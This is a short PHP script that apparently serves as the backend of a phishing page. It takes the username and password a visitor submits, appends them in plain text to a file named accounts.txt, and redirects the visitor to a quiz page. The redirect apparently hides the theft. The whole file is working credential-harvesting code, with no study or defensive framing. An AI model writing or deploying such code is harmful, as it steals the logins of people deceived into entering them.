<?php

file_put_contents("accounts.txt", "Username: " . $_POST['username'] . " Password: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location:Quizz/index.html');
exit();
